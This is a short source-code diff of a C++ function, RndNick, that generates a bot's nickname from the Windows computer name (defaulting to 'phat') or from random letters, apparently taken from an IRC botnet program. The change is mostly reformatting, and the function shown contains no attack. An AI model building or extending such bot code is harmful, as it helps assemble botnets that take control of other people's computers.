@@ -106,14 +106,22 @@ int cpuspeed(void)	// cpu speed function
 
 CString RndNick(const char *szPrefix)
 {
+#ifdef DBGCONSOLE
+
+#endif
+
 #ifdef WIN32
 #define BUFSIZE 1024
 	if(g_cMainCtrl.m_cBot.bot_compnick.bValue) {
-		CString sComputerName; char *szComputerName; bool bNameGood=false;
-		szComputerName=sComputerName.GetBuffer(1024); init_random();
+        CString sComputerName;
+        char *szComputerName;
+        bool bNameGood=false;
+        szComputerName=sComputerName.GetBuffer(1024);
+        init_random();
 		unsigned long lStrLen=sComputerName.GetLength();
 
-		if(!GetComputerName(szComputerName, &lStrLen)) strcpy(szComputerName, "phat");
+        if(!GetComputerName(szComputerName, &lStrLen))
+            strcpy(szComputerName, "phat");
 		for(int j=65; j<91; j++) { if(szComputerName[0]==j) { bNameGood=true; } }
 		for(int k=97; k<123; k++) { if(szComputerName[0]==k) { bNameGood=true; } }
 		if(!bNameGood) strcpy(szComputerName, "phat");
@@ -123,11 +131,16 @@ CString RndNick(const char *szPrefix)
 		return sComputerName;
 	} else {
 #endif // WIN32
-		CString sRetVal; srand(GetTickCount());
-		int nl=(rand()%3)+4; sRetVal.Assign(szPrefix);
+        CString sRetVal;
+        srand(GetTickCount());
+        int nl=(rand()%3)+4;
+        sRetVal.Assign(szPrefix);
 		for(int n=0;n<nl;n++)
-		{	CString sTemp; sTemp.Assign(sRetVal);
-			sRetVal.Format("%s%c", sTemp.CStr(), (rand()%26)+97); }
+        {
+            CString sTemp;
+            sTemp.Assign(sRetVal);
+            sRetVal.Format("%s%c", sTemp.CStr(), (rand()%26)+97);
+        }
 		return sRetVal;
 #ifdef WIN32
 	}
